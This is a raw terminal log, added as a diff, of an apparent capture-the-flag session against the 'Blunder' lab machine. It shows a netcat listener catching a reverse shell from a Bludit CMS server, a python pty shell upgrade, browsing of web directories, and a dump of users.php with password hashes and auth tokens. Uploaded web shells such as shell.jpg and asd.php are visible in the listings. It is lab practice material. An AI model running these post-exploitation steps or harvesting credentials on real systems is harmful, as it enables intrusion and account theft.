@@ -1,0 +1,198 @@
+Script started on 2020-08-29 07:18:59-05:00 [TERM="screen" TTY="/dev/pts/4" COLUMNS="175" LINES="23"]
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_CTF/Blunder[00m$ nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.117] from (UNKNOWN) [10.10.10.191] 47516
+bash: cannot set terminal process group (1079): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ ls
+ls
+reverse.jpg
+shell.jpg
+thumbnails
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ python -c 'import pty;pty.spawn("/bin/bash")'
+<temp$ python -c 'import pty;pty.spawn("/bin/bash")'        
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ stty raw-echo
+stty raw-echo
+stty: invalid argument 'raw-echo'
+Try 'stty --help' for more information.
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ ^[[A^[[A^[[B            ls
+ls
+reverse.jpg  shell.jpg	thumbnails
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ stty raw-echo
+stty raw-echo
+stty: invalid argument 'raw-echo'
+Try 'stty --help' for more information.
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ export TERM=xterm
+export TERM=xterm
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ c clear
+clear
+[H[2J[3Jwww-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ ls
+ls
+reverse.jpg  shell.jpg	thumbnails
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ ca t  t /h	 home/ferf=  gs us
+cat /home/fergus
+cat: /home/fergus: No such file or directory
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ ls
+ls
+reverse.jpg  shell.jpg	thumbnails
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ cd ,,
+cd ,,
+bash: cd: ,,: No such file or directory
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ cd ..
+cd ..
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ ls
+ls
+ctemp  thumbnails
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ d ..
+cd ..
+www-data@blunder:/var/www/bludit-3.9.2/bl-content$ ls
+ls
+cdatabases  pages  tmp  uploads	workspaces
+www-data@blunder:/var/www/bludit-3.9.2/bl-content$ d  cd  cd c	
+cd c
+bash: cd: c: No such file or directory
+www-data@blunder:/var/www/bludit-3.9.2/bl-content$ cd cd	 databases
+cd cdatabases
+bash: cd: cdatabases: No such file or directory
+www-data@blunder:/var/www/bludit-3.9.2/bl-content$ cat cdatabases
+cat cdatabases
+cat: cdatabases: No such file or directory
+www-data@blunder:/var/www/bludit-3.9.2/bl-content$ ls
+ls
+databases  pages  tmp  uploads	workspaces
+www-data@blunder:/var/www/bludit-3.9.2/bl-content$ cd pa	    pages
+cd pages
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/pages$ ls
+ls
+about  blender	empty  stadia  stephen-king  stephen-king-0  usb
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/pages$ cd ..
+cd ..
+www-data@blunder:/var/www/bludit-3.9.2/bl-content$ ls
+ls
+databases  pages  tmp  uploads	workspaces
+www-data@blunder:/var/www/bludit-3.9.2/bl-content$ cd pages/usb
+cd pages/usb
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/pages/usb$ ls
+ls
+index.txt
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/pages/usb$ cat index.txt
+cat index.txt
+<p>Short for <b>universal serial bus</b>, <b>USB</b> (pronounced yoo-es-bee) is a plug and play interface that allows a computer to communicate with peripheral and other devices. USB-connected devices cover a broad range; anything from keyboards and mice, to music players and flash drives. For more information on these devices, see our USB devices section.</p>
+<p>USB may also be used to send power to certain devices, such as smartphones and tablets, as well as charge their batteries. The first commercial release of the Universal Serial Bus (version 1.0) was in January <a href="https://www.computerhope.com/history/1996.htm">1996</a>. This industry standard was then quickly adopted by Intel, Compaq, Microsoft, and other companies.</p>
+<p></p>
+<p></p>www-data@blunder:/var/www/bludit-3.9.2/bl-content/pages/usb$ cd ..
+cd ..
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/pages$ ls
+ls
+about  blender	empty  stadia  stephen-king  stephen-king-0  usb
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/pages$ cd ..
+cd ..
+www-data@blunder:/var/www/bludit-3.9.2/bl-content$ ls
+ls
+databases  pages  tmp  uploads	workspaces
+www-data@blunder:/var/www/bludit-3.9.2/bl-content$ cd t uploads
+cd uploads
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/uploads$ ls
+ls
+asd.php  pages	profiles  thumbnails
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/uploads$ cd profiles
+cd profiles
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/uploads/profiles$ ls
+ls
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/uploads/profiles$ ui  id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/uploads/profiles$ groups
+groups
+www-data
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/uploads/profiles$ ls
+ls
+cwww-data@blunder:/var/www/bludit-3.9.2/bl-content/uploads/profiles$ d ..
+cd ..
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/uploads$ ls
+ls
+casd.php  pages	profiles  thumbnails
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/uploads$ d ..
+cd ..
+www-data@blunder:/var/www/bludit-3.9.2/bl-content$ ls
+ls
+databases  pages  tmp  uploads	workspaces
+www-data@blunder:/var/www/bludit-3.9.2/bl-content$ cd databasess
+cd databasess
+bash: cd: databasess: No such file or directory
+www-data@blunder:/var/www/bludit-3.9.2/bl-content$ ^[[A    cd databases
+cd databases
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ ls
+ls
+categories.php	plugins       site.php	  tags.php
+pages.php	security.php  syslog.php  users.php
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ cat users.php
+cat users.php
+<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
+{
+    "admin": {
+        "nickname": "Admin",
+        "firstName": "Administrator",
+        "lastName": "",
+        "role": "admin",
+        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
+        "salt": "5dde2887e7aca",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""
+    },
+    "fergus": {
+        "firstName": "",
+        "lastName": "",
+        "nickname": "",
+        "description": "",
+        "role": "author",
+        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
+        "salt": "jqxpjfnv",
+        "email": "",
+        "registered": "2019-11-27 13:26:44",
+        "tokenRemember": "",
+        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "codepen": "",
+        "instagram": "",
+        "github": "",
+        "gitlab": "",
+        "linkedin": "",
+        "mastodon": ""
+    }
+}www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ python3 -m http.server
+python3 -m http.servver
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+^C
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_CTF/Blunder[00m$ ls[K[Knc -lvnp 9001exit[K[2Plsvim users.txtmv users.txt mails.txtls[Kvim users.txtrm users.txt ls[Kvim users.txtrm users.txt ls[Kvim users.txt ls[Ksudo vim /etc/hosts[6Pvim /etc/host[8Pclear[3Plsvim users.txtrm users.txt vim users.txtls[K[K[Kstty raw-echo
+stty: invalid argument ‘raw-echo’
+Try 'stty --help' for more information.
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_CTF/Blunder[00m$ stty raw-echo[K[K[K[K[K[K[K[K[K
+speed 38400 baud; line = 0;
+-brkint -imaxbel
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_CTF/Blunder[00m$ stty raw
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_CTF/Blunder[00m$ ls
+blcontent.txt  bruteforce.py  credentials.txt  [0m[01;34mnmap[0m  [01;34mrequests[0m  reverse.log  root.txt  sploit.py  [01;34mupload[0m  wordlists.txt
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_CTF/Blunder[00m$ ls
+blcontent.txt  bruteforce.py  credentials.txt  [0m[01;34mnmap[0m  [01;34mrequests[0m  reverse.log  root.txt  sploit.py  [01;34mupload[0m  wordlists.txt
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_CTF/Blunder[00m$ clear
+[H[J[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_CTF/Blunder[00m$ ;s
+bash: syntax error near unexpected token `;'
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_CTF/Blunder[00m$ ls
+blcontent.txt  bruteforce.py  credentials.txt  [0m[01;34mnmap[0m  [01;34mrequests[0m  reverse.log  root.txt  sploit.py  [01;34mupload[0m  wordlists.txt
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_CTF/Blunder[00m$ exit
+exit
+
+Script done on 2020-08-29 07:30:10-05:00 [COMMAND_EXIT_CODE="0"]
